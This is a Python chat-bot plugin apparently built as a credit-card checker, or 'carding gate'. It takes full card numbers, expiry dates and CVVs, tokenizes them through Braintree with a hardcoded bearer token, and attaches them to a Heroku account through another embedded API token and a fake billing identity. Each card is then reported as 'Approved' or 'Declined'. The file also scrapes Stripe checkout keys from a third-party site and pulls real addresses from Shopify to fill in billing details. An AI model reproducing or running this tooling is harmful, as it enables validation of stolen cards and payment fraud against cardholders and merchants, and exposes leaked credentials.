import re
from datetime import datetime

from requests import Session, patch, post

from ._handler import newMsg
from ._helpers import get_text_content

B3_MESSAGE = """
**B3/Auth $**
**CC:** `{card_number}|{exp_mo}|{exp_year}|{cvc}`
**Status:** __**{status} {emoji}**__
**Message:** `{message}`
**TimeTaken:** `{time}`

"""


@newMsg(pattern="b3")
async def _stripe(e):
    try:
        arg = e.text.split(" ", 1)[1]
    except IndexError:
        await e.reply("`Usage: .stripe <card number> <cvc> <exp>`")
        return
    message = await e.reply("`Processing...`")
    cc, exp_mo, exp_year, cvv = arg.split("|", 3)
    start_time = datetime.now()
    token = tokenize_card(cc.strip(), cvv.strip(), exp_mo.strip(), exp_year.strip())
    if token is None:
        await message.edit("`Invalid card details.`")
        return
    response = b3_auth_heroku(token)
    status, msg, emoji = b3_response_parser(response)
    await message.edit(
        B3_MESSAGE.format(
            emoji=emoji,
            card_number=cc,
            cvc=cvv,
            exp_mo=exp_mo,
            exp_year=exp_year,
            status=status,
            message=msg,
            time=str((datetime.now() - start_time).total_seconds() * 1000) + "ms",
        )
    )


def b3_auth_heroku(token):
    headers = {
        "authority": "api.heroku.com",
        "accept": "application/vnd.heroku+json; version=3",
        "authorization": "Bearer cf0ff874-b73c-4732-a7c5-9524acb07d36",
    }

    data = {
        "address_1": "401 AK St.",
        "address_2": None,
        "city": "Chicago",
        "country": "US",
        "first_name": "Jenna M ",
        "last_name": "Ortega",
        "postal_code": "10800",
        "state": "IL",
        "other": None,
        "nonce": token,
        "device_data": '{"device_session_id":"1f5d4e42701386875b8fe252e96bab97","fraud_merchant_id":"604019","correlation_id":"c1769c09ffdd118cdbc763507964b026"}',
    }

    response = patch(
        "https://api.heroku.com/account/payment-method", headers=headers, json=data
    )
    return response.json()


def tokenize_card(card_number, cvc, exp_mo, exp_year):
    headers = {
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2NTkxNzYwNzgsImp0aSI6IjY0M2Y0YzE1LWNiNmMtNDY1Ny1hOWQ5LTUxNTI2MTQzMDlhZSIsInN1YiI6IjM2OTZzNzczeWRjMnoycjMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjM2OTZzNzczeWRjMnoycjMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.-FyX5EeRKk2j1W5gUEzJXi24RDymCKMyWep9CLqIPyQt63ZggmrbB_cYwovnAaMkxM7LjkWUORERtOmYTNDWxg",
        "Braintree-Version": "2018-05-10",
    }

    data = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": "94c4a395-385a-4ba3-9cad-7ca465cb1c21",
        },
        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
        "variables": {
            "input": {
                "creditCard": {
                    "number": card_number,
                    "expirationMonth": exp_mo,
                    "expirationYear": exp_year,
                    "cvv": cvc,
                },
                "options": {
                    "validate": False,
                },
            },
        },
        "operationName": "TokenizeCreditCard",
    }

    response = post(
        "https://payments.braintree-api.com/graphql", headers=headers, json=data
    )
    try:
        return response.json()["data"]["tokenizeCreditCard"]["token"]
    except:
        return None


def b3_response_parser(resp):
    DEAD = "❌"
    ALIVE = "✅"
    if resp.get("id", "") == "invalid_params":
        return "Declined", resp.get("message", "-"), DEAD
    return "Approved", resp.get("message", "-"), ALIVE


def get_real_address(query, country):
    headers = {
        "origin": "https://checkout.shopify.com",
    }

    data = {
        "query": "\n  query predictions($query: String, $countryCode: AutocompleteSupportedCountry!, $locale: String!, $location: LocationInput, $sessionToken: String!) {\n    predictions(query: $query, countryCode: $countryCode, locale: $locale, location: $location, sessionToken: $sessionToken) {\n      addressId\n      description\n      matchedSubstrings {\n        length\n        offset\n      }\n    }\n  }\n",
        "variables": {
            "query": query,
            "countryCode": country,
            "locale": "en-GB",
            "sessionToken": "1ebc539da44b9c4c591bd548b1f7075d-1659094115528",
        },
    }

    response = requests.post(
        "https://atlas.shopifycloud.com/graphql", headers=headers, json=data
    )
    return parse_address(response.json())


COUNTRY_CODES = [
    "AF",
    "AL",
    "DZ",
    "AS",
    "AD",
    "AO",
    "AI",
    "AQ",
    "AG",
    "AR",
    "AM",
    "AW",
    "AU",
    "AT",
    "AZ",
    "BS",
    "BH",
    "BD",
    "BB",
    "BY",
    "BE",
    "BZ",
    "BJ",
    "BM",
    "BT",
    "BO",
    "BQ",
    "BA",
    "BW",
    "BV",
    "BR",
    "IO",
    "BN",
    "BG",
    "BF",
    "BI",
    "KH",
    "CM",
    "CA",
    "CV",
    "KY",
    "CF",
    "TD",
    "CL",
    "CN",
    "CX",
    "CC",
    "CO",
    "KM",
    "CG",
    "CD",
    "CK",
    "CR",
    "CI",
    "HR",
    "CU",
    "CW",
    "CY",
    "CZ",
    "DK",
    "DJ",
    "DM",
    "DO",
    "EC",
    "EG",
    "SV",
    "GQ",
    "ER",
    "EE",
    "ET",
    "FK",
    "FO",
    "FJ",
    "FI",
    "FR",
    "GF",
    "PF",
    "TF",
    "GA",
    "GM",
    "GE",
    "DE",
    "GH",
    "GI",
    "GR",
    "GL",
    "GD",
    "GP",
    "GU",
    "GT",
    "GG",
    "GN",
    "GW",
    "GY",
    "HT",
    "HM",
    "VA",
    "HN",
    "HK",
    "HU",
    "IS",
    "IN",
    "ID",
    "IR",
    "IQ",
    "IE",
    "IM",
    "IL",
    "IT",
    "JM",
    "JP",
    "JE",
    "JO",
    "KZ",
    "KE",
    "KI",
    "KP",
    "KR",
    "KW",
    "KG",
    "LA",
    "LV",
    "LB",
    "LS",
    "LR",
    "LY",
    "LI",
    "LT",
    "LU",
    "MO",
    "MK",
    "MG",
    "MW",
    "MY",
    "MV",
    "ML",
    "MT",
    "MH",
    "MQ",
    "MR",
    "MU",
    "YT",
    "MX",
    "FM",
    "MD",
    "MC",
    "MN",
    "ME",
    "MS",
    "MA",
    "MZ",
    "MM",
    "NA",
    "NR",
    "NP",
    "NL",
    "NC",
    "NZ",
    "NI",
    "NE",
    "NG",
    "NU",
    "NF",
    "MP",
    "NO",
    "OM",
    "PK",
    "PW",
    "PS",
    "PA",
    "PG",
    "PY",
    "PE",
    "PH",
    "PN",
    "PL",
    "PT",
    "PR",
    "QA",
    "RE",
    "RO",
    "RU",
    "RW",
    "BL",
    "SH",
    "KN",
    "LC",
    "MF",
    "PM",
    "VC",
    "WS",
    "SM",
    "ST",
    "SA",
    "SN",
    "RS",
    "SC",
    "SL",
    "SG",
    "SK",
    "SI",
    "SB",
    "SO",
    "ZA",
    "GS",
    "ES",
    "LK",
    "SD",
    "SR",
    "SJ",
    "SZ",
    "SE",
    "CH",
    "SY",
    "TW",
    "TJ",
    "TZ",
    "TH",
    "TL",
    "TG",
    "TK",
    "TO",
    "TT",
    "TN",
    "TR",
    "TM",
    "TC",
    "TV",
    "UG",
    "UA",
    "AE",
    "GB",
    "US",
    "UM",
    "UY",
    "UZ",
    "VU",
    "VE",
    "VN",
    "VG",
    "VI",
    "WF",
    "EH",
    "YE",
    "ZM",
    "ZW",
]


def get_country_code(text):
    for country_code in COUNTRY_CODES:
        if re.search(r"\b" + country_code + r"\b", text):
            return country_code
    return "IN"


def parse_address(resp):
    addr = []
    if resp.get("data", {}).get("predictions"):
        for x in resp["data"]["predictions"]:
            addr.append(x["description"])
    return addr


@newMsg(pattern="addr")
async def addr(msg):
    content = await get_text_content(msg)
    if not content:
        content = "Food Place"
        country = "US"
    else:
        country = get_country_code(content)
        content = content.lower().replace(country.lower(), "")
    address = get_real_address(content, country)
    if address:
        ADDR = "Address in " + country + ":\n"
        for x in address:
            ADDR += "• `" + x + "`\n"
        await msg.reply(ADDR)
    else:
        await msg.reply("No address found")


def get_full_address(address_id):
    headers = {
        "authority": "atlas.shopifycloud.com",
        "sec-ch-ua": '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
        "sec-ch-ua-mobile": "?0",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
        "accept": "*/*",
        "origin": "https://checkout.shopify.com",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://checkout.shopify.com/",
        "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
    }

    data = {
        "query": "\n  query address($addressId: String!, $locale: String!, $sessionToken: String!) {\n    address(id: $addressId, locale: $locale, sessionToken: $sessionToken) {\n      address1\n      address2\n      city\n      country\n      countryCode\n      province\n      provinceCode\n      zip\n      latitude\n      longitude\n    }\n  }\n",
        "variables": {
            "addressId": "Q2hJSm84S0R2UkFXS1RvUmhnNFotVFYtQklJfHsicXVlcnkiOiI0OTEiLCJwbGFjZXMiOlt7ImlkIjoiQ2hJSm84S0R2UkFXS1RvUmhnNFotVFYtQklJIiwibmFtZSI6IjQ5MTAwMSJ9LHsiaWQiOiJDaElKd2NldjQxOUVLVG9SR0ZEVXdDMlN3b2ciLCJuYW1lIjoiNDkxNDQxIn0seyJpZCI6IkNoSUo0YkFMQVptVUtUb1JFZ1dJc2JUODNUQSIsIm5hbWUiOiI0OTE5OTUifSx7ImlkIjoiQ2hJSmwwZTFoaU56Q0RzUm5GemNxWTZuTDJJIiwibmFtZSI6IjQ5MTYyMWIsIENodXJjaCBSb2FkIn0seyJpZCI6IkNoSUpSMTN3czJkVEtEb1Juc1BTaGFfV19BbyIsIm5hbWUiOiI0OTEzMzUifV0sImNvdW50cnlfY29kZSI6IklOIn0=",
            "locale": "en-GB",
            "sessionToken": "1ebc539da44b9c4c591bd548b1f7075d-1659094115528",
        },
    }

    response = post(
        "https://atlas.shopifycloud.com/graphql", headers=headers, json=data
    )
    return response.json()


def stripe_charge_gate():
    client = Session()
    client.post(
        "https://www.ourfollower.com/wp-admin/admin-ajax.php",
        data={
            "text[1]": "Url",
            "option[1]": "https://www.facebook.com/ananyaapandeyofficial",
            "text[2]": "Current Quantity",
            "option[2]": "10",
            "action": "add_to_cart",
            "id": "213",
        },
    )
    req = client.post(
        "https://www.ourfollower.com/wp-admin/admin-post.php",
        allow_redirects=True,
        data={
            "action": "payment",
            "payment_method": "Stripe",
            "name": "rose",
            "email": "roseloverx@proton.me",
            "btn_submit": "Pay",
        },
    )
    try:
        resp = client.get(req.url).text
        pk_key = (
            re.search("var stripe = (.*)", resp).group(1).split("(")[1].split(")")[0]
        )
        pi_key = re.search("stripe.confirmCardPayment\('(.*)'\,", resp).group(1)
    except:
        return "", ""
    return pk_key, pi_key
